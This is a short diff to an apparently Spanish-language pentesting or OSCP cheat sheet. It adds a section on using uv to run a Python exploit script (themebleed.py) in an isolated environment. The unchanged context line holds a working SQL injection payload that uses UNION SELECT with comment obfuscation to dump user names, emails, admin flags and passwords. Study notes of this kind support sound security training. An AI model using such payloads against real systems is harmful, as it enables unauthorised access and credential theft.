@@ -4503,6 +4503,18 @@ Saca en una sola fila todo
 ')/**/UNION/**/SELECT/**/1,2,concat(name,':',email,':',admin,':',password,':',genres),4,5/**/from/**/users#
 ```
 
+
+## UV para ejecutar cualquier cosa
+
+Para ejecutar por ejemplo un exploit este es un ejemplo de como no romper las dependencias de python
+
+```
+uv venv
+uv pip install -r requirements.txt
+uv run python themebleed.py
+```
+
+
 # Referencias
 
 > https://medium.com/@verylazytech/from-novice-to-ninja-how-the-oscp-cheatsheet-can-catapult-your-cyber-career-0eb446ab041d
